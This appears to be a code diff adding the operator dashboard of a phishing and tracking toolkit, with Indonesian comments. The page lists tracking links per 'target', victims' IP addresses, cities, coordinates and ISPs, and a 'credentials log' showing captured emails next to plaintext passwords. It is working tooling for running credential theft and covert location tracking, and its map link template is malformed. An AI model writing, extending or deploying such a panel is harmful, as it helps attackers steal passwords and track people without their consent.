@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>:: DATABASE RAW VIEW ::</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <script>
+        // Perlindungan halaman, sama seperti dasbor
+        const token = localStorage.getItem('authToken');
+        if (!token) {
+            window.location.href = '/login.html';
+        }
+    </script>
+
+    <div class="dashboard-container" style="flex-direction: column;">
+
+        <div class="dashboard-panel">
+            <div class="header-actions">
+                <h1 class="main-title">> DATABASE_RAW_VIEW</h1>
+                <a href="/dashboard.html" class="hacker-button small cyan">[ << BACK TO DASHBOARD ]</a>
+            </div>
+        </div>
+
+        <div class="dashboard-panel">
+            <h1 class="main-title">> ALL_TRACKING_LINKS.DAT</h1>
+            <div id="links-table-container" style="overflow-x: auto;">
+                <p class="highlight">> Loading links data...</p>
+            </div>
+        </div>
+
+        <div class="dashboard-panel">
+            <h1 class="main-title" style="color: var(--text-accent); border-color: var(--border-accent);">> ALL_LOCATIONS_LOG.DAT</h1>
+            <div id="locations-table-container" style="overflow-x: auto;">
+                <p class="highlight">> Loading locations data...</p>
+            </div>
+        </div>
+
+        <div class="dashboard-panel">
+            <h1 class="main-title" style="color: var(--error-color); border-color: var(--error-color);">> ALL_CREDENTIALS_LOG.DAT</h1>
+            <div id="credentials-table-container" style="overflow-x: auto;">
+                <p class="highlight">> Loading credentials data...</p>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const authToken = localStorage.getItem('authToken');
+        const authHeaders = { 'Authorization': `Bearer ${authToken}` };
+
+        async function fetchProtected(url) {
+            const response = await fetch(url, { headers: authHeaders });
+            if (response.status === 401) {
+                localStorage.removeItem('authToken');
+                window.location.href = '/login.html';
+            }
+            if (!response.ok) {
+                throw new Error('Failed to fetch data');
+            }
+            return response.json();
+        }
+
+        // Fungsi untuk merender tabel Links
+        function renderLinksTable(data) {
+            const container = document.getElementById('links-table-container');
+            if (data.length === 0) {
+                container.innerHTML = `<p class="error">> NO LINKS DATA FOUND.</p>`;
+                return;
+            }
+            let html = `<table class="hacker-table"><thead><tr><th>Created</th><th>Link ID</th><th>Target ID</th><th>Type</th><th>Original URL</th><th>Clicks</th><th>Expires At</th></tr></thead><tbody>`;
+            data.forEach(link => {
+                html += `
+                    <tr>
+                        <td>${new Date(link.created_at).toLocaleString('id-ID')}</td>
+                        <td>${link.id}</td>
+                        <td class="highlight">${link.username}</td>
+                        <td>${link.link_type}</td>
+                        <td><a href="${link.original_url}" target="_blank">${link.original_url.substring(0, 40)}...</a></td>
+                        <td>${link.click_count}</td>
+                        <td>${link.expires_at ? new Date(link.expires_at).toLocaleString('id-ID') : 'Never'}</td>
+                    </tr>`;
+            });
+            html += `</tbody></table>`;
+            container.innerHTML = html;
+        }
+
+        // Fungsi untuk merender tabel Lokasi
+        function renderLocationsTable(data) {
+            const container = document.getElementById('locations-table-container');
+            if (data.length === 0) {
+                container.innerHTML = `<p class="error">> NO LOCATIONS DATA FOUND.</p>`;
+                return;
+            }
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>Link ID</th><th>IP Address</th><th>Country</th><th>City</th><th>Coords (Lat, Lon)</th><th>ISP</th></tr></thead><tbody>`;
+            data.forEach(loc => {
+                const mapUrl = `http://googleusercontent.com/maps/google.com/9{loc.latitude},${loc.longitude}`;
+                html += `
+                    <tr>
+                        <td>${new Date(loc.created_at).toLocaleString('id-ID')}</td>
+                        <td class="highlight">${loc.username}</td>
+                        <td>${loc.tracker_id}</td>
+                        <td>${loc.ip_address}</td>
+                        <td>${loc.country || 'N/A'}</td>
+                        <td>${loc.city || 'N/A'}</td>
+                        <td><a href="${mapUrl}" target="_blank">${loc.latitude}, ${loc.longitude}</a></td>
+                        <td>${loc.isp || 'N/A'}</td>
+                    </tr>`;
+            });
+            html += `</tbody></table>`;
+            container.innerHTML = html;
+        }
+
+        // Fungsi untuk merender tabel Kredensial
+        function renderCredentialsTable(data) {
+            const container = document.getElementById('credentials-table-container');
+            if (data.length === 0) {
+                container.innerHTML = `<p class="error">> NO CREDENTIALS DATA FOUND.</p>`;
+                return;
+            }
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>Link ID</th><th>IP Address</th><th>Email</th><th>Password</th></tr></thead><tbody>`;
+            data.forEach(cred => {
+                html += `
+                    <tr>
+                        <td>${new Date(cred.created_at).toLocaleString('id-ID')}</td>
+                        <td class="highlight">${cred.username}</td>
+                        <td>${cred.tracker_id}</td>
+                        <td>${cred.ip_address}</td>
+                        <td class="highlight">${cred.email}</td>
+                        <td class="error">${cred.password}</td>
+                    </tr>`;
+            });
+            html += `</tbody></table>`;
+            container.innerHTML = html;
+        }
+
+        // Panggil semua fungsi fetch saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', () => {
+            fetchProtected('/api/alldata/links').then(renderLinksTable).catch(err => console.error("Error fetching links:", err));
+            fetchProtected('/api/alldata/locations').then(renderLocationsTable).catch(err => console.error("Error fetching locations:", err));
+            fetchProtected('/api/alldata/credentials').then(renderCredentialsTable).catch(err => console.error("Error fetching credentials:", err));
+        });
+    </script>
+</body>
+</html>
